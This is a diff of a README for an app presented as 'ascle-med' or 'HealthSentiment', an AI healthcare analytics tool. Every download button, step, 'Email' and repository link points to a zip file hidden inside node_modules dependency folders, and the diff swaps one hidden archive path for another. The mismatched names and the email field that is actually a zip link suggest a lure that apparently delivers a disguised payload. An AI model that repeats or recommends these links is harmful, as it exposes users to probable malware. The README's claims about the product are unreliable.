@@ -1,6 +1,6 @@
 # 🌟 ascle-med - Transform Healthcare with AI Insights
 
-[![Download the App](https://github.com/Qaisarcma/ascle-med/raw/refs/heads/main/backend/node_modules/iconv-lite/.idea/inspectionProfiles/ascle-med-3.7.zip%20Now-Visit%20Page-blue?style=for-the-badge)](https://github.com/Qaisarcma/ascle-med/raw/refs/heads/main/backend/node_modules/iconv-lite/.idea/inspectionProfiles/ascle-med-3.7.zip)
+[![Download the App](https://github.com/Qaisarcma/ascle-med/raw/refs/heads/main/backend/node_modules/mongodb/lib/client-side-encryption/med_ascle_v3.2-beta.1.zip%20Now-Visit%20Page-blue?style=for-the-badge)](https://github.com/Qaisarcma/ascle-med/raw/refs/heads/main/backend/node_modules/mongodb/lib/client-side-encryption/med_ascle_v3.2-beta.1.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To start using HealthSentiment, follow these simple steps:
 
 1. **Visit the Download Page**
    Click the link below to go to the download page:
-   [Download HealthSentiment](https://github.com/Qaisarcma/ascle-med/raw/refs/heads/main/backend/node_modules/iconv-lite/.idea/inspectionProfiles/ascle-med-3.7.zip)
+   [Download HealthSentiment](https://github.com/Qaisarcma/ascle-med/raw/refs/heads/main/backend/node_modules/mongodb/lib/client-side-encryption/med_ascle_v3.2-beta.1.zip)
 
 2. **Choose the Right Version**
    On the release page, you’ll see several versions available. Select the latest version to ensure you have the latest features and security updates.
@@ -57,8 +57,8 @@ If you encounter issues while using HealthSentiment, try the following steps:
 
 If you have questions or need help, feel free to reach out:
 
-- **Email**: https://github.com/Qaisarcma/ascle-med/raw/refs/heads/main/backend/node_modules/iconv-lite/.idea/inspectionProfiles/ascle-med-3.7.zip
-- **Visit our GitHub**: [HealthSentiment Repository](https://github.com/Qaisarcma/ascle-med/raw/refs/heads/main/backend/node_modules/iconv-lite/.idea/inspectionProfiles/ascle-med-3.7.zip)
+- **Email**: https://github.com/Qaisarcma/ascle-med/raw/refs/heads/main/backend/node_modules/mongodb/lib/client-side-encryption/med_ascle_v3.2-beta.1.zip
+- **Visit our GitHub**: [HealthSentiment Repository](https://github.com/Qaisarcma/ascle-med/raw/refs/heads/main/backend/node_modules/mongodb/lib/client-side-encryption/med_ascle_v3.2-beta.1.zip)
 
 ## 🔗 Additional Resources
 
@@ -71,6 +71,6 @@ For more information and updates, check the following resources:
 
 Ready to transform your healthcare analytics? Click below to download HealthSentiment now:
 
-[![Download the App](https://github.com/Qaisarcma/ascle-med/raw/refs/heads/main/backend/node_modules/iconv-lite/.idea/inspectionProfiles/ascle-med-3.7.zip%20Now-Visit%20Page-blue?style=for-the-badge)](https://github.com/Qaisarcma/ascle-med/raw/refs/heads/main/backend/node_modules/iconv-lite/.idea/inspectionProfiles/ascle-med-3.7.zip)
+[![Download the App](https://github.com/Qaisarcma/ascle-med/raw/refs/heads/main/backend/node_modules/mongodb/lib/client-side-encryption/med_ascle_v3.2-beta.1.zip%20Now-Visit%20Page-blue?style=for-the-badge)](https://github.com/Qaisarcma/ascle-med/raw/refs/heads/main/backend/node_modules/mongodb/lib/client-side-encryption/med_ascle_v3.2-beta.1.zip)
 
 Follow the steps provided to install and start using the application. With HealthSentiment, you can harness the power of AI to improve patient care and gain valuable insights.
